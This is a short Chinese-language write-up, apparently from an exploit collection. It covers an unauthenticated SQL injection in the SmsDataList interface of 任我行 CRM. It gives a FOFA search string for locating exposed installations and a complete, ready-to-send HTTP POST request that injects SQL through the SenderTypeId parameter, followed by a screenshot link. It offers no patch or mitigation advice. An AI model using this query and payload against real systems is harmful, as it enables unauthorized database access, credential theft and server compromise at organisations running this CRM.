# 任我行CRM系统SQL注入漏洞

## 1.漏洞描述

任我行 CRM SmsDataList 接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。

## 2.搜索语法

```plain
fofa："欢迎使用任我行CRM"
```

## 3.漏洞复现

```plain
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

Keywords=&StartSendDate=2024-06-17&EndSendDate=2024-06-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
```

![image](https://github.com/hardog123/poc-exp/assets/170905460/407ac7b7-9865-4759-9390-a614a6927d1c)
